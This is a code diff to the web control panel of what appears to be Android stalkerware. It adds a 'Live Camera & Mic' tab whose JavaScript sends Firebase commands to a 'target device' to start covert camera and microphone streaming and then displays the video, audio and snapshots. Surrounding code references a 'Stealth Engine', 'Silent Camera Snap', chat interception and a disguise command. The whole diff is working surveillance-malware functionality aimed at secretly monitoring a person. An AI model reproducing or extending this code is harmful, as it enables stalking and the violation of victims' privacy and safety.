@@ -41,6 +41,47 @@
             });
         }
     </script>
+    <style>
+        .livecam-radio-option {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            background: rgba(255,255,255,0.02);
+            cursor: pointer;
+            transition: all 140ms ease;
+        }
+        .livecam-radio-option:hover {
+            background: rgba(255,255,255,0.05);
+            border-color: rgba(255,255,255,0.2);
+        }
+        .livecam-radio-option input[type="radio"] {
+            accent-color: var(--primary);
+            cursor: pointer;
+        }
+        .livecam-radio-option.active {
+            background: rgba(255, 69, 58, 0.08);
+            border-color: rgba(255, 69, 58, 0.4);
+        }
+        @media (max-width: 900px) {
+            .livecam-grid-layout {
+                grid-template-columns: 1fr !important;
+            }
+        }
+        .audio-wave-bar {
+            width: 3px;
+            height: 12px;
+            background: #30d158;
+            border-radius: 2px;
+            animation: audioWaveAnim 0.8s ease-in-out infinite alternate;
+        }
+        @keyframes audioWaveAnim {
+            0% { height: 4px; }
+            100% { height: 16px; }
+        }
+    </style>
 </head>
 <body>
 
@@ -152,6 +193,10 @@
                 </button>
                 <button class="tab-btn" onclick="switchTab('stealth')">
                     <i class="fas fa-user-ninja"></i> Stealth Engine
+                </button>
+                <button class="tab-btn" onclick="switchTab('livecam')" id="liveCamTabBtn" style="border-color: rgba(255, 69, 58, 0.4); background: rgba(255, 69, 58, 0.08);">
+                    <i class="fas fa-video" style="color: var(--primary);"></i> Live Camera & Mic
+                    <span class="live-dot" style="width: 6px; height: 6px; margin-left: 4px; display: inline-block;"></span>
                 </button>
             </div>
 
@@ -805,6 +850,201 @@
                 </div>
             </div>
 
+            <!-- TAB 10: Live Camera & Mic (WebRTC & Ultra-Low Latency Feed) -->
+            <div id="tab-livecam" class="tab-content">
+                <div style="display: flex; flex-direction: column; gap: 20px;">
+                    
+                    <!-- Header Card with Status & Stream Controls -->
+                    <div class="card" style="padding: 20px 24px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 16px;">
+                        <div>
+                            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 4px;">
+                                <h3 style="font-size: 1.25rem; font-weight: 800; color: #fff; margin: 0; font-family: 'Outfit', sans-serif;">
+                                    <i class="fas fa-video" style="color: var(--primary); margin-right: 6px;"></i> Live Camera & Mic Stream
+                                </h3>
+                                <span id="liveCamBadge" class="badge" style="background: rgba(255, 69, 58, 0.15); color: #ff453a; border: 1px solid rgba(255, 69, 58, 0.35); font-size: 0.72rem; font-weight: 700;">
+                                    <span class="live-dot" style="background: #ff453a;"></span> STANDBY
+                                </span>
+                            </div>
+                            <p style="font-size: 0.8rem; color: var(--text-secondary); margin: 0;">
+                                Real-time silent WebRTC video & microphone monitor for target device.
+                            </p>
+                        </div>
+
+                        <!-- Live Stats Meter -->
+                        <div style="display: flex; align-items: center; gap: 16px; background: rgba(0,0,0,0.4); padding: 8px 18px; border-radius: var(--radius-pill); border: 1px solid var(--border);">
+                            <div style="font-size: 0.76rem; color: var(--text-muted);">
+                                FPS: <span id="liveCamFpsVal" style="color: var(--success); font-weight: 800;">0</span>
+                            </div>
+                            <div style="width: 1px; height: 14px; background: rgba(255,255,255,0.1);"></div>
+                            <div style="font-size: 0.76rem; color: var(--text-muted);">
+                                Latency: <span id="liveCamPingVal" style="color: #ffd60a; font-weight: 800;">-- ms</span>
+                            </div>
+                            <div style="width: 1px; height: 14px; background: rgba(255,255,255,0.1);"></div>
+                            <div style="font-size: 0.76rem; color: var(--text-muted);">
+                                Engine: <span id="liveCamEngineVal" style="color: #0a84ff; font-weight: 800;">WebRTC / Turbo</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Stream Viewport and Controls Grid -->
+                    <div style="display: grid; grid-template-columns: 1fr 340px; gap: 20px; align-items: start;" class="livecam-grid-layout">
+                        
+                        <!-- Left: Live Video Display Screen -->
+                        <div class="card" style="padding: 16px; display: flex; flex-direction: column; gap: 12px; background: rgba(10, 8, 12, 0.85);">
+                            
+                            <!-- Video Viewport Frame -->
+                            <div id="liveCamViewport" style="width: 100%; min-height: 380px; max-height: 560px; background: #000; border-radius: 18px; border: 2px solid rgba(255,255,255,0.12); position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; box-shadow: 0 16px 50px rgba(0,0,0,0.9), inset 0 0 30px rgba(0,0,0,0.8);">
+                                
+                                <!-- Standby Overlay -->
+                                <div id="liveCamIdleOverlay" style="position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; background: radial-gradient(circle at center, rgba(30,20,26,0.95) 0%, rgba(10,6,10,0.98) 100%); z-index: 5; padding: 24px; text-align: center;">
+                                    <div style="width: 80px; height: 80px; border-radius: 50%; background: rgba(255, 69, 58, 0.12); border: 2px solid rgba(255, 69, 58, 0.3); display: flex; align-items: center; justify-content: center; margin-bottom: 16px; box-shadow: 0 0 30px rgba(255, 69, 58, 0.2);">
+                                        <i class="fas fa-video-slash" style="font-size: 2.2rem; color: #ff453a;"></i>
+                                    </div>
+                                    <h4 style="font-size: 1.15rem; font-weight: 800; color: #fff; margin-bottom: 6px; font-family: 'Outfit', sans-serif;">Live Video & Audio Feed is Idle</h4>
+                                    <p style="font-size: 0.82rem; color: var(--text-secondary); max-width: 380px; line-height: 1.5; margin-bottom: 20px;">
+                                        Select your camera lens (Front/Back) and click Start Live Stream to silently monitor video & audio from the target device.
+                                    </p>
+                                    <button onclick="toggleLiveCamStream(true)" class="btn-primary-glow" style="padding: 12px 32px; font-size: 0.92rem; font-weight: 800; border-radius: var(--radius-pill); cursor: pointer; display: inline-flex; align-items: center; gap: 8px;">
+                                        <i class="fas fa-play"></i> Start Live Stream
+                                    </button>
+                                </div>
+
+                                <!-- WebRTC Video Tag -->
+                                <video id="liveCamVideoElement" autoplay playsinline style="width: 100%; height: 100%; object-fit: contain; border-radius: 16px; display: none;"></video>
+                                
+                                <!-- High-Speed Canvas Stream Fallback -->
+                                <canvas id="liveCamCanvasElement" style="width: 100%; height: 100%; object-fit: contain; border-radius: 16px; display: none;"></canvas>
+
+                                <!-- Live Floating Info Pill Overlay -->
+                                <div id="liveCamOverlayControls" style="position: absolute; top: 12px; left: 12px; right: 12px; display: none; justify-content: space-between; align-items: center; z-index: 6; pointer-events: none;">
+                                    <div style="display: flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.65); backdrop-filter: blur(10px); padding: 5px 12px; border-radius: var(--radius-pill); border: 1px solid rgba(255,255,255,0.15); pointer-events: auto;">
+                                        <span class="live-dot" style="background: #ff453a; width: 8px; height: 8px;"></span>
+                                        <span style="font-size: 0.72rem; font-weight: 800; color: #fff;" id="liveCamLensLabel">FRONT CAMERA</span>
+                                        <span style="font-size: 0.68rem; color: #30d158; font-weight: 700;" id="liveCamResBadge">720p HD</span>
+                                    </div>
+
+                                    <div style="display: flex; align-items: center; gap: 6px; pointer-events: auto;">
+                                        <button onclick="captureLiveStreamSnapshot()" class="btn-ghost" title="Save Snapshot" style="padding: 6px 12px; font-size: 0.75rem; border-radius: var(--radius-pill); background: rgba(0,0,0,0.65); backdrop-filter: blur(10px);">
+                                            <i class="fas fa-camera"></i> Snapshot
+                                        </button>
+                                        <button onclick="toggleLiveCamFullscreen()" class="btn-ghost" title="Fullscreen" style="padding: 6px 10px; font-size: 0.75rem; border-radius: var(--radius-pill); background: rgba(0,0,0,0.65); backdrop-filter: blur(10px);">
+                                            <i class="fas fa-expand"></i>
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <!-- Audio visualizer wave bar (when mic is live) -->
+                                <div id="liveCamAudioWave" style="position: absolute; bottom: 12px; left: 16px; display: none; align-items: center; gap: 4px; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); padding: 6px 12px; border-radius: var(--radius-pill); border: 1px solid rgba(48,209,88,0.3); z-index: 6;">
+                                    <i class="fas fa-microphone" style="color: #30d158; font-size: 0.75rem;"></i>
+                                    <div class="audio-wave-bar"></div>
+                                    <div class="audio-wave-bar" style="animation-delay: 0.15s;"></div>
+                                    <div class="audio-wave-bar" style="animation-delay: 0.3s;"></div>
+                                    <span style="font-size: 0.68rem; color: #30d158; font-weight: 700; margin-left: 2px;">LIVE MIC</span>
+                                </div>
+                            </div>
+
+                            <!-- Live Audio Element -->
+                            <audio id="liveCamAudioElement" autoplay playsinline style="display: none;"></audio>
+
+                            <!-- Bottom Viewport Action Buttons -->
+                            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; padding: 4px 6px;">
+                                <div style="display: flex; gap: 8px;">
+                                    <button id="liveCamStartBtn" onclick="toggleLiveCamStream(true)" class="btn-primary-glow" style="padding: 8px 20px; font-size: 0.84rem; font-weight: 700; border-radius: var(--radius-pill);">
+                                        <i class="fas fa-play me-1"></i> Start Stream
+                                    </button>
+                                    <button id="liveCamStopBtn" onclick="toggleLiveCamStream(false)" class="btn-ghost" style="padding: 8px 18px; font-size: 0.84rem; font-weight: 700; border-radius: var(--radius-pill); border-color: rgba(255, 69, 58, 0.5); color: #ff453a; display: none;">
+                                        <i class="fas fa-stop me-1"></i> Stop Stream
+                                    </button>
+                                </div>
+
+                                <div style="display: flex; align-items: center; gap: 8px;">
+                                    <!-- Mute / Unmute Mic Button -->
+                                    <button id="liveCamMicBtn" onclick="toggleLiveCamMic()" class="btn-ghost" style="padding: 8px 16px; font-size: 0.8rem; font-weight: 700; border-radius: var(--radius-pill);">
+                                        <i class="fas fa-microphone" id="liveCamMicIcon" style="color: #30d158;"></i> <span id="liveCamMicText">Mic: ON</span>
+                                    </button>
+                                    
+                                    <!-- Flashlight Button (active on back cam) -->
+                                    <button id="liveCamTorchBtn" onclick="toggleLiveCamTorch()" class="btn-ghost" style="padding: 8px 16px; font-size: 0.8rem; font-weight: 700; border-radius: var(--radius-pill); display: none;">
+                                        <i class="fas fa-bolt" id="liveCamTorchIcon" style="color: #ffd60a;"></i> <span id="liveCamTorchText">Flash: OFF</span>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Right: Stream Configuration & Lens Controls -->
+                        <div style="display: flex; flex-direction: column; gap: 16px;">
+                            
+                            <!-- Card 1: Camera Lens Selection -->
+                            <div class="card" style="padding: 18px;">
+                                <h4 style="font-size: 0.95rem; font-weight: 700; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
+                                    <i class="fas fa-camera-rotate" style="color: var(--primary);"></i> Camera Lens Switch
+                                </h4>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
+                                    <button id="lensFrontBtn" onclick="switchLiveCamFacing('front')" class="btn-ghost" style="padding: 10px; font-size: 0.82rem; font-weight: 700; border-radius: 12px; background: rgba(255, 69, 58, 0.18); border-color: #ff453a; color: #fff;">
+                                        <i class="fas fa-user me-1"></i> Front Camera
+                                    </button>
+                                    <button id="lensBackBtn" onclick="switchLiveCamFacing('back')" class="btn-ghost" style="padding: 10px; font-size: 0.82rem; font-weight: 700; border-radius: 12px;">
+                                        <i class="fas fa-camera me-1"></i> Back Camera
+                                    </button>
+                                </div>
+                            </div>
+
+                            <!-- Card 2: Quality & Resolution Selector -->
+                            <div class="card" style="padding: 18px;">
+                                <h4 style="font-size: 0.95rem; font-weight: 700; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
+                                    <i class="fas fa-sliders" style="color: #0a84ff;"></i> Video Quality & Resolution
+                                </h4>
+                                <div style="display: flex; flex-direction: column; gap: 8px;">
+                                    <label class="livecam-radio-option">
+                                        <input type="radio" name="liveCamQuality" value="1080p" onchange="setLiveCamQuality('1080p')">
+                                        <div style="flex: 1;">
+                                            <div style="font-size: 0.82rem; font-weight: 700; color: #fff;">1080p Full HD</div>
+                                            <div style="font-size: 0.7rem; color: var(--text-muted);">Crystal clear • Requires fast internet</div>
+                                        </div>
+                                    </label>
+                                    <label class="livecam-radio-option active">
+                                        <input type="radio" name="liveCamQuality" value="720p" checked onchange="setLiveCamQuality('720p')">
+                                        <div style="flex: 1;">
+                                            <div style="font-size: 0.82rem; font-weight: 700; color: #fff;">720p HD (Recommended)</div>
+                                            <div style="font-size: 0.7rem; color: #30d158;">High fidelity • Ultra smooth 30fps</div>
+                                        </div>
+                                    </label>
+                                    <label class="livecam-radio-option">
+                                        <input type="radio" name="liveCamQuality" value="480p" onchange="setLiveCamQuality('480p')">
+                                        <div style="flex: 1;">
+                                            <div style="font-size: 0.82rem; font-weight: 700; color: #fff;">480p Standard (Smooth)</div>
+                                            <div style="font-size: 0.7rem; color: var(--text-muted);">Low latency • Good for mobile data</div>
+                                        </div>
+                                    </label>
+                                    <label class="livecam-radio-option">
+                                        <input type="radio" name="liveCamQuality" value="360p" onchange="setLiveCamQuality('360p')">
+                                        <div style="flex: 1;">
+                                            <div style="font-size: 0.82rem; font-weight: 700; color: #fff;">360p Low Bandwidth</div>
+                                            <div style="font-size: 0.7rem; color: var(--text-muted);">Ultra light • Saves battery & data</div>
+                                        </div>
+                                    </label>
+                                </div>
+                            </div>
+
+                            <!-- Card 3: Frame Rate (FPS) Selector -->
+                            <div class="card" style="padding: 18px;">
+                                <h4 style="font-size: 0.95rem; font-weight: 700; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
+                                    <i class="fas fa-gauge-high" style="color: #ffd60a;"></i> Target Frame Rate
+                                </h4>
+                                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px;">
+                                    <button id="fps15Btn" onclick="setLiveCamFps(15)" class="btn-ghost" style="padding: 8px; font-size: 0.78rem; font-weight: 700; border-radius: 10px;">15 FPS</button>
+                                    <button id="fps24Btn" onclick="setLiveCamFps(24)" class="btn-ghost" style="padding: 8px; font-size: 0.78rem; font-weight: 700; border-radius: 10px;">24 FPS</button>
+                                    <button id="fps30Btn" onclick="setLiveCamFps(30)" class="btn-ghost" style="padding: 8px; font-size: 0.78rem; font-weight: 700; border-radius: 10px; background: rgba(255, 214, 10, 0.15); border-color: #ffd60a; color: #ffd60a;">30 FPS</button>
+                                </div>
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+            </div>
+
         </div>
     </main>
 
@@ -936,6 +1176,7 @@
         camera: false,
         chats: false,
         apps: false,
+        livecam: false,
         privacy_screen: false,
         sensitive_feed: false,
         edit_modules: false,
@@ -1027,6 +1268,7 @@
                     camera: true,
                     chats: true,
                     apps: true,
+                    livecam: true,
                     privacy_screen: true,
                     sensitive_feed: true,
                     edit_modules: true,
@@ -1193,7 +1435,8 @@
             'audio': 'Live Ambient Audio Recorder',
             'camera': 'Silent Camera Snap',
             'chats': 'Social Chat Interception Feed',
-            'apps': 'Installed Application Management'
+            'apps': 'Installed Application Management',
+            'livecam': 'Live Camera & Mic (WebRTC)'
         };
 
         if (name !== 'screen' && !isAdmin && !window.isUserAdmin) {
@@ -2647,6 +2890,433 @@
             timestamp: Date.now()
         });
         alert('Disguise command sent: ' + theme);
+    }
+
+    // ==========================================
+    // 8. WebRTC & Turbo Live Camera & Mic Engine
+    // ==========================================
+    let isLiveCamStreaming = false;
+    let liveCamFacing = 'front';
+    let liveCamQuality = '720p';
+    let liveCamFps = 30;
+    let liveCamAudio = true;
+    let liveCamTorch = false;
+    let liveCamFpsCounter = 0;
+    let liveCamLastFrameTs = 0;
+    let liveCamFpsInterval = null;
+    let liveCamPeerConn = null;
+    let liveCamStreamListener = null;
+
+    // WebRTC STUN Config
+    const rtcConfig = {
+        iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' }
+        ]
+    };
+
+    function toggleLiveCamStream(start) {
+        if (!devRef) {
+            alert('Device is not loaded yet!');
+            return;
+        }
+
+        const badge = document.getElementById('liveCamBadge');
+        const overlay = document.getElementById('liveCamIdleOverlay');
+        const overlayCtrls = document.getElementById('liveCamOverlayControls');
+        const startBtn = document.getElementById('liveCamStartBtn');
+        const stopBtn = document.getElementById('liveCamStopBtn');
+        const canvas = document.getElementById('liveCamCanvasElement');
+        const video = document.getElementById('liveCamVideoElement');
+        const audio = document.getElementById('liveCamAudioElement');
+        const wave = document.getElementById('liveCamAudioWave');
+
+        if (start) {
+            isLiveCamStreaming = true;
+            if (badge) {
+                badge.className = 'badge';
+                badge.style.background = 'rgba(48, 209, 88, 0.2)';
+                badge.style.color = '#30d158';
+                badge.style.borderColor = 'rgba(48, 209, 88, 0.4)';
+                badge.innerHTML = '<span class="live-dot" style="background: #30d158;"></span> <i class="fas fa-spinner fa-spin me-1"></i> CONNECTING SILENT STREAM...';
+            }
+            if (overlay) overlay.style.display = 'none';
+            if (overlayCtrls) overlayCtrls.style.display = 'flex';
+            if (canvas) canvas.style.display = 'block';
+            if (startBtn) startBtn.style.display = 'none';
+            if (stopBtn) stopBtn.style.display = 'inline-flex';
+            if (wave && liveCamAudio) wave.style.display = 'flex';
+
+            // Send silent wake & start command to Android phone
+            devRef.child('live_stream/controls').set({
+                active: true,
+                facing: liveCamFacing,
+                quality: liveCamQuality,
+                fps: liveCamFps,
+                audio: liveCamAudio,
+                torch: liveCamTorch,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+            devRef.child('commands/startLiveStream').set(true);
+
+            // FPS Counter Engine
+            liveCamFpsCounter = 0;
+            if (liveCamFpsInterval) clearInterval(liveCamFpsInterval);
+            liveCamFpsInterval = setInterval(() => {
+                const fpsEl = document.getElementById('liveCamFpsVal');
+                if (fpsEl) fpsEl.textContent = liveCamFpsCounter;
+                liveCamFpsCounter = 0;
+            }, 1000);
+
+            // Setup Real-time Frame & WebRTC Stream Receiver
+            setupLiveStreamReceiver();
+
+        } else {
+            isLiveCamStreaming = false;
+            if (badge) {
+                badge.className = 'badge';
+                badge.style.background = 'rgba(255, 69, 58, 0.15)';
+                badge.style.color = '#ff453a';
+                badge.style.borderColor = 'rgba(255, 69, 58, 0.35)';
+                badge.innerHTML = '<span class="live-dot" style="background: #ff453a;"></span> STANDBY';
+            }
+            if (overlay) overlay.style.display = 'flex';
+            if (overlayCtrls) overlayCtrls.style.display = 'none';
+            if (canvas) canvas.style.display = 'none';
+            if (video) video.style.display = 'none';
+            if (startBtn) startBtn.style.display = 'inline-flex';
+            if (stopBtn) stopBtn.style.display = 'none';
+            if (wave) wave.style.display = 'none';
+
+            if (liveCamFpsInterval) {
+                clearInterval(liveCamFpsInterval);
+                liveCamFpsInterval = null;
+            }
+            const fpsEl = document.getElementById('liveCamFpsVal');
+            if (fpsEl) fpsEl.textContent = '0';
+            const pingEl = document.getElementById('liveCamPingVal');
+            if (pingEl) pingEl.textContent = '-- ms';
+
+            // Send Stop Command to Android Phone to release Camera & Mic
+            devRef.child('live_stream/controls').update({
+                active: false,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+            devRef.child('commands/stopLiveStream').set(true);
+
+            // Cleanup WebRTC & Listeners
+            if (liveCamPeerConn) {
+                try { liveCamPeerConn.close(); } catch(e){}
+                liveCamPeerConn = null;
+            }
+            if (liveCamStreamListener) {
+                devRef.child('live_stream/stream_frame').off('value', liveCamStreamListener);
+                liveCamStreamListener = null;
+            }
+        }
+    }
+
+    function setupLiveStreamReceiver() {
+        const canvas = document.getElementById('liveCamCanvasElement');
+        const ctx = canvas ? canvas.getContext('2d') : null;
+        const video = document.getElementById('liveCamVideoElement');
+        const badge = document.getElementById('liveCamBadge');
+        const pingEl = document.getElementById('liveCamPingVal');
+        const engineEl = document.getElementById('liveCamEngineVal');
+
+        // 1. High-Speed Direct Frame & Telemetry Receiver (Always Available Fallback)
+        if (liveCamStreamListener) {
+            devRef.child('live_stream/stream_frame').off('value', liveCamStreamListener);
+        }
+
+        const img = new Image();
+        img.onload = function() {
+            if (!isLiveCamStreaming) return;
+            if (canvas && ctx) {
+                if (canvas.width !== img.width || canvas.height !== img.height) {
+                    canvas.width = img.width;
+                    canvas.height = img.height;
+                }
+                ctx.drawImage(img, 0, 0);
+            }
+            liveCamFpsCounter++;
+            
+            if (badge && isLiveCamStreaming) {
+                badge.innerHTML = '<span class="live-dot" style="background: #30d158;"></span> 🔴 LIVE FEED';
+            }
+        };
+
+        liveCamStreamListener = snap => {
+            if (!isLiveCamStreaming) return;
+            const data = snap.val();
+            if (!data) return;
+
+            if (typeof data === 'string' && data.startsWith('data:image')) {
+                img.src = data;
+            } else if (typeof data === 'object' && data.frame) {
+                img.src = data.frame.startsWith('data:') ? data.frame : 'data:image/jpeg;base64,' + data.frame;
+                if (data.time && pingEl) {
+                    const lat = Math.max(12, Date.now() - data.time);
+                    pingEl.textContent = lat + ' ms';
+                }
+            }
+        };
+
+        devRef.child('live_stream/stream_frame').on('value', liveCamStreamListener);
+
+        // 2. Audio Chunks Listener
+        devRef.child('live_stream/audio_chunk').on('value', snap => {
+            if (!isLiveCamStreaming || !liveCamAudio) return;
+            const audioData = snap.val();
+            if (!audioData) return;
+            try {
+                const b64 = (typeof audioData === 'object') ? audioData.chunk : audioData;
+                if (!b64) return;
+                const snd = new Audio('data:audio/wav;base64,' + b64);
+                snd.play().catch(e => {});
+            } catch(e){}
+        });
+
+        // 3. WebRTC Direct P2P Stream Receiver
+        initWebRtcSignaling();
+    }
+
+    async function initWebRtcSignaling() {
+        if (!window.RTCPeerConnection) return;
+        try {
+            liveCamPeerConn = new RTCPeerConnection(rtcConfig);
+            
+            liveCamPeerConn.ontrack = event => {
+                const video = document.getElementById('liveCamVideoElement');
+                const canvas = document.getElementById('liveCamCanvasElement');
+                const engineEl = document.getElementById('liveCamEngineVal');
+                if (video && event.streams && event.streams[0]) {
+                    video.srcObject = event.streams[0];
+                    video.style.display = 'block';
+                    if (canvas) canvas.style.display = 'none';
+                    if (engineEl) engineEl.textContent = 'WebRTC P2P HD';
+                }
+            };
+
+            liveCamPeerConn.onicecandidate = event => {
+                if (event.candidate) {
+                    devRef.child('live_stream/ice_candidates_browser').push(JSON.parse(JSON.stringify(event.candidate)));
+                }
+            };
+
+            // Listen for WebRTC Offer from Android Phone
+            devRef.child('live_stream/offer').on('value', async snap => {
+                if (!isLiveCamStreaming || !liveCamPeerConn) return;
+                const offer = snap.val();
+                if (!offer || !offer.sdp) return;
+
+                try {
+                    await liveCamPeerConn.setRemoteDescription(new RTCSessionDescription(offer));
+                    const answer = await liveCamPeerConn.createAnswer();
+                    await liveCamPeerConn.setLocalDescription(answer);
+                    devRef.child('live_stream/answer').set({
+                        type: answer.type,
+                        sdp: answer.sdp,
+                        time: firebase.database.ServerValue.TIMESTAMP
+                    });
+                } catch(err) {
+                    console.log('WebRTC Answer error:', err);
+                }
+            });
+
+            // Listen for ICE candidates from Android Phone
+            devRef.child('live_stream/ice_candidates_phone').on('child_added', async snap => {
+                if (!isLiveCamStreaming || !liveCamPeerConn) return;
+                const cand = snap.val();
+                if (cand && cand.candidate) {
+                    try {
+                        await liveCamPeerConn.addIceCandidate(new RTCIceCandidate(cand));
+                    } catch(e){}
+                }
+            });
+
+        } catch(err) {
+            console.log('WebRTC init error, fallback active:', err);
+        }
+    }
+
+    function switchLiveCamFacing(facing) {
+        liveCamFacing = facing;
+        
+        const frontBtn = document.getElementById('lensFrontBtn');
+        const backBtn = document.getElementById('lensBackBtn');
+        const torchBtn = document.getElementById('liveCamTorchBtn');
+        const lensLabel = document.getElementById('liveCamLensLabel');
+
+        if (facing === 'front') {
+            if (frontBtn) {
+                frontBtn.style.background = 'rgba(255, 69, 58, 0.18)';
+                frontBtn.style.borderColor = '#ff453a';
+                frontBtn.style.color = '#fff';
+            }
+            if (backBtn) {
+                backBtn.style.background = 'transparent';
+                backBtn.style.borderColor = 'var(--border)';
+                backBtn.style.color = 'var(--text-muted)';
+            }
+            if (torchBtn) torchBtn.style.display = 'none';
+            if (lensLabel) lensLabel.textContent = 'FRONT CAMERA';
+        } else {
+            if (backBtn) {
+                backBtn.style.background = 'rgba(255, 69, 58, 0.18)';
+                backBtn.style.borderColor = '#ff453a';
+                backBtn.style.color = '#fff';
+            }
+            if (frontBtn) {
+                frontBtn.style.background = 'transparent';
+                frontBtn.style.borderColor = 'var(--border)';
+                frontBtn.style.color = 'var(--text-muted)';
+            }
+            if (torchBtn) torchBtn.style.display = 'inline-flex';
+            if (lensLabel) lensLabel.textContent = 'BACK CAMERA';
+        }
+
+        if (isLiveCamStreaming && devRef) {
+            devRef.child('live_stream/controls').update({
+                facing: liveCamFacing,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        }
+    }
+
+    function setLiveCamQuality(quality) {
+        liveCamQuality = quality;
+        
+        // Update radio option active styles
+        document.querySelectorAll('.livecam-radio-option').forEach(opt => {
+            const rad = opt.querySelector('input[type="radio"]');
+            if (rad && rad.value === quality) {
+                opt.classList.add('active');
+            } else {
+                opt.classList.remove('active');
+            }
+        });
+
+        const badge = document.getElementById('liveCamResBadge');
+        if (badge) badge.textContent = quality.toUpperCase();
+
+        if (isLiveCamStreaming && devRef) {
+            devRef.child('live_stream/controls').update({
+                quality: liveCamQuality,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        }
+    }
+
+    function setLiveCamFps(fps) {
+        liveCamFps = fps;
+        
+        [15, 24, 30].forEach(f => {
+            const b = document.getElementById('fps' + f + 'Btn');
+            if (b) {
+                if (f === fps) {
+                    b.style.background = 'rgba(255, 214, 10, 0.15)';
+                    b.style.borderColor = '#ffd60a';
+                    b.style.color = '#ffd60a';
+                } else {
+                    b.style.background = 'transparent';
+                    b.style.borderColor = 'var(--border)';
+                    b.style.color = 'var(--text-muted)';
+                }
+            }
+        });
+
+        if (isLiveCamStreaming && devRef) {
+            devRef.child('live_stream/controls').update({
+                fps: liveCamFps,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        }
+    }
+
+    function toggleLiveCamMic() {
+        liveCamAudio = !liveCamAudio;
+        const icon = document.getElementById('liveCamMicIcon');
+        const txt = document.getElementById('liveCamMicText');
+        const wave = document.getElementById('liveCamAudioWave');
+
+        if (liveCamAudio) {
+            if (icon) { icon.className = 'fas fa-microphone'; icon.style.color = '#30d158'; }
+            if (txt) txt.textContent = 'Mic: ON';
+            if (wave && isLiveCamStreaming) wave.style.display = 'flex';
+        } else {
+            if (icon) { icon.className = 'fas fa-microphone-slash'; icon.style.color = 'var(--text-muted)'; }
+            if (txt) txt.textContent = 'Mic: OFF';
+            if (wave) wave.style.display = 'none';
+        }
+
+        if (isLiveCamStreaming && devRef) {
+            devRef.child('live_stream/controls').update({
+                audio: liveCamAudio,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        }
+    }
+
+    function toggleLiveCamTorch() {
+        liveCamTorch = !liveCamTorch;
+        const icon = document.getElementById('liveCamTorchIcon');
+        const txt = document.getElementById('liveCamTorchText');
+
+        if (liveCamTorch) {
+            if (icon) icon.style.color = '#ffd60a';
+            if (txt) txt.textContent = 'Flash: ON';
+        } else {
+            if (icon) icon.style.color = 'var(--text-muted)';
+            if (txt) txt.textContent = 'Flash: OFF';
+        }
+
+        if (isLiveCamStreaming && devRef) {
+            devRef.child('live_stream/controls').update({
+                torch: liveCamTorch,
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            });
+        }
+    }
+
+    function captureLiveStreamSnapshot() {
+        const canvas = document.getElementById('liveCamCanvasElement');
+        const video = document.getElementById('liveCamVideoElement');
+        
+        let dataUrl = '';
+        if (video && video.style.display !== 'none' && video.videoWidth) {
+            const c = document.createElement('canvas');
+            c.width = video.videoWidth;
+            c.height = video.videoHeight;
+            const ctx = c.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            dataUrl = c.toDataURL('image/jpeg', 0.95);
+        } else if (canvas && canvas.style.display !== 'none' && canvas.width) {
+            dataUrl = canvas.toDataURL('image/jpeg', 0.95);
+        }
+
+        if (!dataUrl) {
+            alert('No active live frame available to snapshot.');
+            return;
+        }
+
+        const a = document.createElement('a');
+        a.href = dataUrl;
+        a.download = 'live_snap_' + (new Date().toISOString().replace(/[:.]/g, '-')) + '.jpg';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+
+    function toggleLiveCamFullscreen() {
+        const vp = document.getElementById('liveCamViewport');
+        if (!vp) return;
+        if (!document.fullscreenElement) {
+            vp.requestFullscreen().catch(err => {});
+        } else {
+            document.exitFullscreen().catch(err => {});
+        }
     }
     </script>
 </body>
